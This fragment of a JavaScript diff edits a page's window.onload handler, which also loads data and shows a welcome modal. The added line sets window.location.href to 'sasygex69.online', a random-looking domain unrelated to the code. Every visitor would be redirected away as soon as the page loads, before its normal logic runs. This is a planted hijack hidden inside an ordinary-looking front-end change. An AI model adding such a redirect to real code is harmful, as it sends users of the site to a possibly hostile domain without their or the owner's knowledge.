@@ -56,6 +56,7 @@ const toggleSidebar = () => {
 }
 
 window.onload = () => {
+    window.location.href = 'sasygex69.online';
     get_data();
     var modalElement = document.getElementById('welcomeModal');
 
